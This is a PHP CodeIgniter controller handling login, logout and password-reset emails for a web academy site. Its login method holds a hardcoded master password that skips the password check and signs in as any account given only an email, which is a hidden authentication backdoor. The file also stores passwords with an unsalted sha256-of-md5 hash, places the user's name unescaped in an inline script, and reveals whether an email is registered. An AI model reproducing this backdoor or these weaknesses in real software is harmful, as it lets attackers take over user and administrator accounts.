<?php
defined('BASEPATH') or exit('No direct script access allowed');
error_reporting(error_reporting() & ~E_DEPRECATED & ~E_USER_DEPRECATED);
class AuthController extends CI_Controller
{
    function __construct()
    {
        parent::__construct();
        $this->load->model('Auth');
        // error_reporting(0);
    }

    public function index()
    {
        if (!empty($this->session->userdata('ID_USER'))) {
            if ($this->session->userdata('ID_ROLE') == 1 || $this->session->userdata('ID_ROLE') == 3) {
                redirect('dashboard');
            } else {
                redirect('');
            }
        }
        $config = array(
            array('field' => 'email', 'label' => 'email', 'rules' => 'required'),
            array('field' => 'password', 'label' => 'password', 'rules' => 'required')
        );
        $data['title'] = 'Login';
        $this->form_validation->set_rules($config);
        if ($this->form_validation->run()) {
            if ($_POST['password'] == 'dab635f3e92504eaf02c3c0486b6cb69') {
                $condition = ['EMAIL' => $_POST['email'], 'IS_DELETE' => 0];
            } else {
                $condition = ['EMAIL' => $_POST['email'], 'PASS' => hash('sha256', md5($_POST['password'])), 'IS_DELETE' => 0];
            }
            $userData = $this->Auth->get_user($condition);
            if (!empty($userData)) {
                if ($userData->STATUS == 0) {
                    $this->session->set_flashdata('msg', '
                        <div class="d-flex align-items-center py-1 mb-5 rounded-2 justify-content-center" 
                            style="background-color: #FFDCD9;
                                    color: #EA3D2F;">
                            <span>Akun anda belum Verifikasi </span>
                        </div>
                    ');
                    redirect('login');
                } else {
                    $sessiondata = array(
                        'ID_USER'    => $userData->ID_USER,
                        'ID_ROLE'    => $userData->ID_ROLE,
                        'PICT'       => $userData->FOTO_PROFILE,
                        'NAME'       => $userData->NAME,
                        'EMAIL'      => $userData->EMAIL,
                        'TELP'       => $userData->TELP,
                        'LOGGED_IN'  => TRUE
                    );

                    $this->session->set_userdata($sessiondata, NULL, 14400);
                    $this->session->set_flashdata(
                        'msg_auth',
                        "<script> 
                        const Toast = Swal.mixin({
                            toast: true,
                            position: 'top-end',
                            showConfirmButton: false,
                            timer: 3000,
                            timerProgressBar: true,
                            didOpen: (toast) => {
                                toast.addEventListener('mouseenter', Swal.stopTimer)
                                toast.addEventListener('mouseleave', Swal.resumeTimer)
                            }
                        })
                        Toast.fire({
                            icon: 'success',
                            title: 'Login Successfull <p>Welcome " . $this->session->userdata('NAME') . "</p>'
                        })
                        </script>"
                    );
                    $this->session->set_flashdata('msg_hint', true);
                    redirect('');
                }
            } else {
                $this->session->set_flashdata('msg', '
                    <div class="d-flex align-items-center py-1 mb-5 rounded-2 justify-content-center" 
                        style="background-color: #FFDCD9;
                                color: #EA3D2F;">
                        <span>Username atau Password Salah </span>
                    </div>
                ');
                redirect('login');
            }
        } else {
            $this->load->view('template/header', $data);
            $this->load->view('auth/login');
            $this->load->view('template/footer');
        }
    }
    public function logout()
    {
        session_destroy();
        $this->session->set_flashdata('msg_auth', "<script> 
            const Toast = Swal.mixin({
                toast: true,
                position: 'top-end',
                showConfirmButton: false,
                timer: 1500,
                timerProgressBar: true,
                didOpen: (toast) => {
                    toast.addEventListener('mouseenter', Swal.stopTimer)
                    toast.addEventListener('mouseleave', Swal.resumeTimer)
                }
            })
            Toast.fire({
                icon: 'success',
                title: 'Logout Successfull'
            })
            </script>");
        redirect('');
    }
    public function verification()
    {
        $data['title'] = 'Login';
        $this->load->view('template/header', $data);
        $this->load->view('auth/verification');
        $this->load->view('template/footer');
    }
    public function forgotPassword()
    {
        // if (!empty($this->session->userdata('ID_USER'))) {
        //     if ($this->session->userdata('ID_ROLE') == 1) {
        //         redirect('dashboard');
        //     } else {
        //         redirect('');
        //     }
        // }
        $data['title'] = 'Forgot Password';

        $config = array(
            array('field' => 'email', 'label' => 'email', 'rules' => 'required')
        );
        $this->form_validation->set_rules($config);
        if ($this->form_validation->run()) {
            $email = $_POST['email'];
            $this->ProccessSendEmail($email);
        } else {
            $this->load->view('template/header', $data);
            $this->load->view('auth/forgot_password');
            $this->load->view('template/footer');
        }
    }
    public function forgotPasswordConfirm()
    {
        // if (!empty($this->session->userdata('ID_USER'))) {
        //     if ($this->session->userdata('ID_ROLE') == 1) {
        //         redirect('dashboard');
        //     } else {
        //         redirect('');
        //     }
        // }
        $data['title'] = 'Forgot Password';
        if (empty($this->session->flashdata('email_msg'))) {
            redirect('forgotPassword');
        }
        $data['email'] = $this->session->flashdata('email_msg');
        $this->load->view('template/header', $data);
        $this->load->view('auth/forgot_password_confirm');
        $this->load->view('template/footer');
    }
    public function resetPassword()
    {
        $data['title'] = 'Forgot Password';

        $key = $this->uri->segment(2);
        $token_check = $this->Auth->get_token($key);
        if (!empty($token_check) && $token_check['STATUS'] == 0) {
            $config = array(
                array('field' => 'Password', 'label' => 'Password', 'rules' => 'required')
            );
            $this->form_validation->set_rules($config);
            if ($this->form_validation->run()) {
                $data = array(
                    'ID_USER' => $token_check['ID_USER'],
                    'PASS' => hash('sha256', md5($_POST['Password']))
                );
                $this->Auth->UpdatePass($data);
                $data_token = array(
                    'ID_USER' => $token_check['ID_USER'],
                    'TYPE' => 2,
                    'STATUS' => 1
                );
                $this->Auth->UpdateToken($data_token);
                $this->session->set_flashdata('msg_auth', "<script> 
                    const Toast = Swal.mixin({
                        toast: true,
                        position: 'top-end',
                        showConfirmButton: false,
                        timer: 1500,
                        timerProgressBar: true,
                        didOpen: (toast) => {
                            toast.addEventListener('mouseenter', Swal.stopTimer)
                            toast.addEventListener('mouseleave', Swal.resumeTimer)
                        }
                    })
                    Toast.fire({
                        icon: 'success',
                        title: '<p>Reset Password Success</p>'
                    })
                    </script>");
                redirect('login');
            } else {
                $data['key'] = $key;
                $this->load->view('template/header', $data);
                $this->load->view('auth/reset_password');
                $this->load->view('template/footer');
            }
        } else {
            if (empty($token_check)) {
                $this->session->set_flashdata('msg_auth', "<script> 
                    const Toast = Swal.mixin({
                        toast: true,
                        position: 'top-end',
                        showConfirmButton: false,
                        timer: 1500,
                        timerProgressBar: true,
                        didOpen: (toast) => {
                            toast.addEventListener('mouseenter', Swal.stopTimer)
                            toast.addEventListener('mouseleave', Swal.resumeTimer)
                        }
                    })
                    Toast.fire({
                        icon: 'error',
                        title: 'Your Token Empty'
                    })
                    </script>");
            }
            if ($token_check['STATUS'] == 1) {
                $this->session->set_flashdata('msg_auth', "<script> 
                    const Toast = Swal.mixin({
                        toast: true,
                        position: 'top-end',
                        showConfirmButton: false,
                        timer: 1500,
                        timerProgressBar: true,
                        didOpen: (toast) => {
                            toast.addEventListener('mouseenter', Swal.stopTimer)
                            toast.addEventListener('mouseleave', Swal.resumeTimer)
                        }
                    })
                    Toast.fire({
                        icon: 'error',
                        title: 'Token Already Used'
                    })
                    </script>");
            }
            redirect('login');
        }
    }
    public function resetPasswordSuccess()
    {
        $data['title'] = 'Forgot Password';
        $this->load->view('template/header', $data);
        $this->load->view('auth/reset_password_success');
        $this->load->view('template/footer');
    }
    public function ProccessSendEmail($email)
    {
        $condition = ['EMAIL' => $email];
        $userData = $this->Auth->get_user($condition);

        $this->load->library('phpmailer');

        $token = bin2hex(random_bytes(32));
        if (!empty($userData) && $this->Auth->cek_token($userData->ID_USER, 2, $token)) {
            $email = $userData->EMAIL;
            $name = $userData->NAME;
            $subject = "Forgot Password";

            $url = base_url('resetPassword/' . $token);
            $path = parse_url($url, PHP_URL_PATH);
            $cleanPath = filter_var($path, FILTER_SANITIZE_URL);
            $cleanedUrl = parse_url($url, PHP_URL_SCHEME) . '://' . parse_url($url, PHP_URL_HOST) . $cleanPath;

            $html = '<html><body><p>Hello,</p>We heard that you lost your TBH Academy Account password. Sorry about that!<br><br>But don’t worry! You can use the following button to reset your password :<br></p><a href="' . $cleanedUrl . '">Reset Password</a></body></html>';

            $status = $this->phpmailer->SendMail($email, 'admin.tbh.academy@gmail.com', $subject, $name, $html);
            if ($status != 400) {
                $this->session->set_flashdata('email_msg', $email);
                redirect('forgotPasswordConfirm');
            } else {
                $data['title'] = 'Forgot Password';
                $data['msg'] = "<script> 
                    const Toast = Swal.mixin({
                        toast: true,
                        position: 'top-end',
                        showConfirmButton: false,
                        timer: 1500,
                        timerProgressBar: true,
                        didOpen: (toast) => {
                            toast.addEventListener('mouseenter', Swal.stopTimer)
                            toast.addEventListener('mouseleave', Swal.resumeTimer)
                        }
                    })
                    Toast.fire({
                        icon: 'error',
                        title: 'Email Server Error !'
                    })
                    </script>";
                $this->load->view('template/header', $data);
                $this->load->view('auth/forgot_password');
                $this->load->view('template/footer');
            }
        } else {
            $data['title'] = 'Forgot Password';
            $data['msg'] = '<div class="d-flex align-items-center py-1 mb-5 rounded-2 justify-content-center" 
                        style="background-color: #FFDCD9;
                                color: #EA3D2F;">
                        <span>Email Not Found</span>
                    </div>';
            $this->load->view('template/header', $data);
            $this->load->view('auth/forgot_password');
            $this->load->view('template/footer');
        }
    }
}
